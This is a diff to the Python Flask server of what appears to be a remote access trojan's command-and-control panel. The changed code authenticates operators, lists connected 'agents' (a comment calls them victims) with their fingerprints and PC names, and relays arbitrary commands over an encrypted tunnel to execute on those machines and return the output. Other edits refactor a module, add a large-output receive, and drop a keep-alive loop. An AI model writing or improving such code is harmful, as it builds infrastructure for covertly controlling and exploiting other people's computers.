@@ -13,9 +13,11 @@ import logging
 from flask import Flask, request, jsonify
 from dataclasses import dataclass
 
-from lib import api, logger
-from lib.api import HTTP_SESSION
+from lib import logger, http
+from lib.http import HTTP_SESSION
 from lib.crypto import EncryptedTunnel, get_hwid
+
+# TODO: "alive connection" check
 
 @dataclass
 class ServerConfig:
@@ -50,7 +52,7 @@ except Exception as e:
 
 def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
     
-    # >>> [ACCESS] <<<
+    # >>> [ ACCESS ] <<<
     
     @app_api.route("/access", methods=["POST"])
     def access():
@@ -77,7 +79,7 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
             logger.info(f"{request.remote_addr}: failed to authenticate ({USERNAME}:{PASSWORD})")
             return jsonify({"error": "Username or password invalid"}), 401
 
-     # >>> [GET_AGENTS] <<<
+     # >>> [ GET_AGENTS ] <<<
     
     @app_api.route("/get_agents/<session>")
     def send_agents(session):
@@ -88,7 +90,7 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
             agents_info: list[list] = []
             for agent in server_cfg.AGENTS:
                 FINGERPRINT = server_cfg.AGENTS[agent][0].decode()
-                PCNAME = server_cfg.AGENTS[agent][1]
+                PCNAME = server_cfg.AGENTS[agent][1]   
                 
                 agents_info.append([agent, FINGERPRINT, PCNAME])
 
@@ -99,7 +101,7 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
             logger.info(f"{request.remote_addr}: invalid session ({session})")
             return jsonify({"error": "Invalid session"})
 
-    # >>> [EXIST_AGENT] <<<
+    # >>> [ EXIST_AGENT ] <<<
 
     @app_api.route("/exist_agent", methods=["POST"])
     def check_agent_exist():
@@ -109,7 +111,7 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         AGENT_FINGERPRINT = json_body["fingerprint"]
 
         if http_session.exist(request.remote_addr, SESSION):
-            agent_addr = api.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
+            agent_addr = http.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
             
             return jsonify({"exist": not (agent_addr is None), "addr": agent_addr})
 
@@ -122,19 +124,21 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         COMMAND: bytes = json_body["command"].encode()
         AGENT_FINGERPRINT: str = json_body["fingerprint"]
 
-        agent_addr = api.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
+        if len(COMMAND) <= 0:
+            return
+
+        agent_addr = http.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
 
         if not (agent_addr is None):
             s: EncryptedTunnel = server_cfg.AGENTS[agent_addr][2]
             
             try:
                 logger.info(f"sending ({COMMAND}) command to {agent_addr}")             
-                # TODO: do better  -> set recv dynamic bufsize
                 s.send(COMMAND)
 
-                logger.info("command output sended") 
+                logger.info("command sended") 
 
-                command_output = s.recv(server_cfg.BUFSIZE).decode()       
+                command_output = s.recv_big(server_cfg.BUFSIZE).decode()
                 return jsonify({"output": command_output})
             
             except Exception as e:
@@ -182,20 +186,6 @@ def handle_agents(client_socket: socket.socket, client_addr: tuple):
 
     # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
     server_cfg.AGENTS[formated_peername] = [fingerprint, "pcname", enctunnel]
-
-    client_socket.setblocking(0)
-    ready = select.select([client_socket], [], [], 5)
-
-    # Stay alive
-    while True:
-        time.sleep(10)
-        try:
-            enctunnel.send(b'2')    
-            if ready[0]:
-                enctunnel.recv(2)
-        except:
-            server_cfg.AGENTS.pop(formated_peername)
-            break
 
 def server_agents(ip: str, port: int):
     server_socket = socket.socket()
